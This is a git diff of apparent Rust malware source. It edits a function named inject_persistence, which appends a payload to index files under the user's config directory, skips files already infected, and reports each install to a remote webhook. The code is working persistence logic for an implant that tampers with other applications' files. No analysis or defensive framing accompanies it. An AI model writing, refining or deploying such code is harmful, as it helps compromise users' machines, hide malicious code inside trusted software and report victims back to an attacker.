@@ -2,11 +2,9 @@ use crate::network;
 use dirs;
 use regex::Regex;
 use std::fs;
-use std::fs::File;
 use std::fs::OpenOptions;
 use std::io::prelude::*;
 use std::path::PathBuf;
-use std::process::Command;
 
 pub fn get_paths() -> Vec<PathBuf> {
     let app_data = dirs::config_dir();
@@ -111,15 +109,22 @@ pub fn inject_persistence() {
             continue;
         }
 
-        let mut file_handle = OpenOptions::new().read(true).write(true).open(&index_file).expect("failed to open file");
+        let mut file_handle = OpenOptions::new()
+            .read(true)
+            .write(true)
+            .open(&index_file)
+            .expect("failed to open file");
 
         let mut file_data = String::new();
         file_handle
             .read_to_string(&mut file_data)
-            .expect("failed to read file");
+            .expect("unable to read file");
 
+        if file_data.chars().count() > 500 {
+            return; //already installed persist - ghetto way
+        }
         file_handle
-            .write_all(to_dump.as_bytes())
+            .write_all(format!("\n{}", to_dump).as_bytes())
             .expect("unable to write to file");
         network::send_webhook_message(&format!(
             "installed persistence to {}",
